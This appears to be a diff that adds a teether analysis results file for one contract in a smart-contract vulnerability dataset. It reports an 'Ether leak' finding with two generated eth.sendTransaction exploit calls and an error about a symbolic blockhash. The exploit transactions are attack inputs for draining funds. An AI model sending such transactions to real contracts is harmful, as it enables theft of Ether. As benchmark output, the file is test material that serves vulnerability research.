@@ -1,0 +1,22 @@
+{
+    "errors": [
+        "Failed path due to symbolic blockhash index"
+    ],
+    "fails": [],
+    "findings": [
+        {
+            "exploit": [
+                "eth.sendTransaction({from:\"0x0000000000000000000000000000000000001234\", data:\"0x2a8de0cae0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0\", to:\"0x4000000000000000000000000000000000000000\", gasPrice:0})",
+                "eth.sendTransaction({from:\"0x0000000000000000000000000000000000001234\", data:\"0xb11cc099c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0\", to:\"0x4000000000000000000000000000000000000000\", gasPrice:0})"
+            ],
+            "filename": "dataset/unchecked_low_level_calls/0xb620cee6b52f96f3c6b253e6eea556aa2d214a99.rt.hex",
+            "name": "Ether leak"
+        }
+    ],
+    "infos": [],
+    "parser": {
+        "id": "teether",
+        "mode": "runtime",
+        "version": "2022/11/11"
+    }
+}
